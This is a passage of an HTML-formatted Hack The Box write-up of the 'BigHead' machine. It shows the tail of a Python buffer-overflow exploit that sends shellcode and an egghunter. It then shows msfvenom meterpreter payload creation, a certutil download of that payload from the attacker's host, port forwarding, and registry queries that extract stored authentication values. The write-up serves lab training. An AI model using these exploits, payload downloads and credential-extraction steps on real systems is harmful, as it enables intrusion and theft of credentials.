		&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;connect&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;host&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;POST / HTTP/1.1&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\r\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Host: dev.bighead.htb&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\r\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Content-Length: &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\r\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;shellcode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\r\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;shellcode&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\r\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\r\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
		&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\033&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;[34m'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'['&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;N&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'] '&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;re&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sub&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;r&quot;\s&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot; &quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;12&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;N&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\033&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;[32m [*] Done&quot;&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;send_egghunter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;host&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;egghunter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\033&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;[32m [*] Sending EggHunter&quot;&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;AF_INET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SOCK_STREAM&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;connect&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;host&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;settimeout&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;None&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;HEAD /&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;A&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;72&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;f0125062&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;egghunter&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot; HTTP/1.1&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\r\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Host: dev.bighead.htb&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\r\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\r\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\033&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;[34m'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;re&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sub&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;r&quot;\s&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot; &quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;12&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\033&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;[32m [*] Done&quot;&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;send_shellcode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;N&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;host&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;egg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;shellcode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;send_egghunter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;host&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;egghunter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;now-its-show-time-lets-test-the-exploit-&quot;&gt;Now it’s show time, Let’s test the exploit :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/bighead/83.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;perfectly-working--we-got-a-reverse-shell&quot;&gt;Perfectly working ! we got a reverse shell.&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;enumeration-enumeration-enumeration-&quot;&gt;Enumeration, Enumeration, Enumeration …&lt;/h3&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/bighead/84.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;we-are-on-the-machine-as-nelson-there-is-another-user-on-the-box-called-nginx-&quot;&gt;We are on the machine as &lt;code class=&quot;highlighter-rouge&quot;&gt;nelson&lt;/code&gt;, There is another user on the box called &lt;code class=&quot;highlighter-rouge&quot;&gt;nginx&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/bighead/85.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;i-checked-cusersnelson-and-cusersnelsondesktop-and-i-found-the-user-flag-&quot;&gt;I checked &lt;code class=&quot;highlighter-rouge&quot;&gt;C:\Users\Nelson&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;C:\Users\Nelson\Desktop&lt;/code&gt; and I found the user flag :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/bighead/86.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/bighead/87.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;2962-bytes-well--no-its-not-the-user-flag-&quot;&gt;2962 bytes? Well … no it’s not the user flag :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/bighead/88.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;so-we-probably-we-need-to-be-nginx-to-get-the-user-flag-and-of-course-we-cant-access-nginx-directory-&quot;&gt;So we probably we need to be &lt;code class=&quot;highlighter-rouge&quot;&gt;nginx&lt;/code&gt; to get the user flag. And of course we can’t access &lt;code class=&quot;highlighter-rouge&quot;&gt;nginx&lt;/code&gt; directory :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/bighead/89.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;i-wanted-to-upgrade-that-reverse-shell-into-meterpreter-so-i-had-to-create-the-payload-first-&quot;&gt;I wanted to upgrade that reverse shell into &lt;code class=&quot;highlighter-rouge&quot;&gt;meterpreter&lt;/code&gt; so I had to create the payload first :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;msfvenom -p windows/meterpreter_reverse_tcp LHOST=10.10.xx.xx LPORT=1338 -f exe &amp;gt; m.exe&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/bighead/90.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;then-i-set-up-the-meterpreter-handler-&quot;&gt;Then I set up the &lt;code class=&quot;highlighter-rouge&quot;&gt;meterpreter&lt;/code&gt; handler :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/bighead/91.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;i-ran-a-python-simple-http-server-on-port-80--python--m-simplehttpserver-80-to-host-the-payload-then-i-went-to-cusersnelsonappdatalocaltemp-and-downloaded-the-payload-with-certutil-&quot;&gt;I ran a python simple http server on port 80 : &lt;code class=&quot;highlighter-rouge&quot;&gt;python -m SimpleHTTPServer 80&lt;/code&gt; to host the payload. Then I went to &lt;code class=&quot;highlighter-rouge&quot;&gt;C:\Users\Nelson\AppData\Local\Temp&lt;/code&gt; and downloaded the payload with &lt;code class=&quot;highlighter-rouge&quot;&gt;certutil&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;certutil -urlcache -split -f http://10.10.xx.xx/m.exe m.exe&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/bighead/92.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;then-i-executed-it-and-got-a-meterpreter-session-&quot;&gt;Then I executed it and got a &lt;code class=&quot;highlighter-rouge&quot;&gt;meterpreter&lt;/code&gt; session :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/bighead/93.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/bighead/94.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;from-meterpreter-i-wanted-to-look-at-the-services-so-i-did-ps-i-looked-through-them-and-found-an-interesting-service-called-bvsshserverexe&quot;&gt;From &lt;code class=&quot;highlighter-rouge&quot;&gt;meterpreter&lt;/code&gt; I wanted to look at the services so I did &lt;code class=&quot;highlighter-rouge&quot;&gt;ps&lt;/code&gt;, I looked through them and found an interesting service called &lt;code class=&quot;highlighter-rouge&quot;&gt;BvSshServer.exe&lt;/code&gt;&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/bighead/95.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;i-wanted-to-know-the-listening-port-of-that-ssh-server-so-i-did-netstat-it-was-listening-on-port-2020-&quot;&gt;I wanted to know the listening port of that ssh server, so I did &lt;code class=&quot;highlighter-rouge&quot;&gt;netstat&lt;/code&gt;. It was listening on port 2020 :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/bighead/96.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;so-i-forwarded-that-port-we-also-saw-earlier-when-we-went-to-codebigheadhtb-it-redirected-us-to-http1270015080testlinkloginphp-i-wanted-to-forward-that-port-too-to-check-whats-in-there-to-forward-a-port-through-meterpreter-we-can-simply-do-it-with-portfwd-&quot;&gt;So I forwarded that port, We also saw earlier when we went to &lt;code class=&quot;highlighter-rouge&quot;&gt;code.bighead.htb&lt;/code&gt; it redirected us to &lt;code class=&quot;highlighter-rouge&quot;&gt;http://127.0.0.1:5080/testlink/login.php&lt;/code&gt;. I wanted to forward that port too to check what’s in there. To forward a port through &lt;code class=&quot;highlighter-rouge&quot;&gt;meterpreter&lt;/code&gt; we can simply do it with &lt;code class=&quot;highlighter-rouge&quot;&gt;portfwd&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;portfwd add -l 2020 -p 2020 -r bighead.htb&lt;/code&gt;
&lt;br /&gt;
&lt;code class=&quot;highlighter-rouge&quot;&gt;portfwd add -l 5080 -p 5080 -r bighead.htb&lt;/code&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/bighead/97.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;lets-check-if-that-bvsshserver-is-a-real-ssh-server-&quot;&gt;Let’s check if that &lt;code class=&quot;highlighter-rouge&quot;&gt;BvSshServer&lt;/code&gt; is a real ssh server :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/bighead/98.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;its-working-fine-now-we-need-a-password-to-login-we-already-know-the-username--nginx&quot;&gt;It’s working fine, now we need a password to login. We already know the username : &lt;code class=&quot;highlighter-rouge&quot;&gt;nginx&lt;/code&gt;.&lt;/h4&gt;
&lt;h4 id=&quot;i-went-to-codebigheadhtb-again-and-after-i-got-redirected-to-port-5080-on-localhost-i-got-some-sql-errors-&quot;&gt;I went to &lt;code class=&quot;highlighter-rouge&quot;&gt;code.bighead.htb&lt;/code&gt; again and after I got redirected to port 5080 on &lt;code class=&quot;highlighter-rouge&quot;&gt;localhost&lt;/code&gt; I got some &lt;code class=&quot;highlighter-rouge&quot;&gt;SQL&lt;/code&gt; errors :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/bighead/99.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/bighead/100.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;as-you-can-see-it-disclosed-the-root-path--of-the-application--cxampp-i-tried-to-go-there-but-i-got-access-denied-&quot;&gt;As you can see it disclosed the root path  of the application : &lt;code class=&quot;highlighter-rouge&quot;&gt;C:\xampp&lt;/code&gt;. I tried to go there but I got access denied :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/bighead/101.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;after-a-lot-of-enumeration-i-checked-the-registry-and-in-hklmsystemcurrentcontrolsetservices-i-found-the-registry-for-nignx-the-web-server-&quot;&gt;After a lot of enumeration I checked the &lt;code class=&quot;highlighter-rouge&quot;&gt;registry&lt;/code&gt; and in &lt;code class=&quot;highlighter-rouge&quot;&gt;HKLM\System\CurrentControlSet\Services\&lt;/code&gt; I found the &lt;code class=&quot;highlighter-rouge&quot;&gt;registry&lt;/code&gt; for &lt;code class=&quot;highlighter-rouge&quot;&gt;nignx&lt;/code&gt; (The web server) :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;reg enumkey -k 'HKLM\System\CurrentControlSet\Services\'&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/bighead/102.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/bighead/103.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;then-i-looked-at-the-values-and-i-found-two-interesting-ones-&quot;&gt;Then I looked at the values and I found two interesting ones :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;reg enumkey -k 'HKLM\System\CurrentControlSet\Services\nginx&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/bighead/104.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;meterpreter &amp;gt; reg enumkey -k 'HKLM\System\CurrentControlSet\Services\nginx'
Enumerating: HKLM\System\CurrentControlSet\Services\nginx

  Keys (2):

        Parameters
        Enum

  Values (12):

        Type
        Start
        ErrorControl
        ImagePath
        DisplayName
        ObjectName
        Description
        DelayedAutostart
        FailureActionsOnNonCrashFailures
        FailureActions
        Authenticate
        PasswordHash
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;authenticate-and-passwordhash-lets-look-at-the-value-&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Authenticate&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;PasswordHash&lt;/code&gt;. Let’s look at the value :&lt;/h4&gt;
&lt;h4 id=&quot;authenticate-&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Authenticate&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;reg queryval -k 'HKLM\System\CurrentControlSet\Services\nginx' -v Authenticate&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/bighead/105.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;meterpreter &amp;gt; reg queryval -k 'HKLM\System\CurrentControlSet\Services\nginx' -v Authenticate
Key: HKLM\System\CurrentControlSet\Services\nginx
Name: Authenticate
Type: REG_BINARY
Data: 4800370033004200700055005900320055007100390055002d005900750067007900740035004600590055006200590030002d0055003800370074003800370000000000
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;passwordhash-&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;PasswordHash&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;reg queryval -k 'HKLM\System\CurrentControlSet\Services\nginx' -v PasswordHash&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/bighead/106.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;meterpreter &amp;gt; reg queryval -k 'HKLM\System\CurrentControlSet\Services\nginx' -v PasswordHash
Key: HKLM\System\CurrentControlSet\Services\nginx
Name: PasswordHash
Type: REG_SZ
Data: 336d72676e6333205361797a205472794861726465722e2e2e203b440a
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;authenticate--4800370033004200700055005900320055007100390055002d005900750067007900740035004600590055006200590030002d0055003800370074003800370000000000&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Authenticate&lt;/code&gt; : &lt;code class=&quot;highlighter-rouge&quot;&gt;4800370033004200700055005900320055007100390055002d005900750067007900740035004600590055006200590030002d0055003800370074003800370000000000&lt;/code&gt;&lt;/h4&gt;
&lt;h4 id=&quot;passwordhash--336d72676e6333205361797a205472794861726465722e2e2e203b440a&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;PasswordHash&lt;/code&gt; : &lt;code class=&quot;highlighter-rouge&quot;&gt;336d72676e6333205361797a205472794861726465722e2e2e203b440a&lt;/code&gt;&lt;/h4&gt;
&lt;h4 id=&quot;looks-like-hex-lets-see-authenticate-&quot;&gt;Looks like &lt;code class=&quot;highlighter-rouge&quot;&gt;hex&lt;/code&gt;, Let’s see &lt;code class=&quot;highlighter-rouge&quot;&gt;Authenticate&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/bighead/107.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;the-output-was-kinda-weird-thats-because-of-the-null-bytes-i-removed-them-then-i-got-the-right-output-&quot;&gt;The output was kinda weird, that’s because of the null bytes, I removed them then I got the right output :&lt;/h4&gt;
